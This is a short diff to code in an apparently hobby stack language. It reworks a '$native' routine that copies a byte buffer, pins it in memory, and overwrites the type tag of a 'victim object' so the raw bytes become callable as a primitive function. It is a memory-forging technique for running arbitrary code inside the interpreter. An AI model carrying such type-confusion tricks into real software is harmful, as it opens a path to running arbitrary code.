@@ -158,26 +158,22 @@
   ^res
 ) $join
 
-(%code
-  if (^code list-len not)
-    () const
-  else
-    (
-      ^code l>b $buf
+(%obuf
+  ; copy to seperate
+  ^obuf bs alloc %buf
+  ^obuf ^buf 0 0 ^buf bs buf-copy
 
-      ; make buffer persist
-      4 ^buf o>p 1 + mem !
+  ; make buffer persist
+  4 ^buf o>p 1 + mem !
 
-      ; victim object
-      ^buf b>p %fn
-      ^fn o>p %fptr
+  ; victim object
+  ^buf b>p %fn
+  ^fn o>p %fptr
 
-      ; make PRIM
-      2 ^fptr mem !
+  ; make PRIM
+  2 ^fptr mem !
 
-      ^fn
-    )
-  endif
+  ^fn
 ) $native
 
 (%buf %addr %v
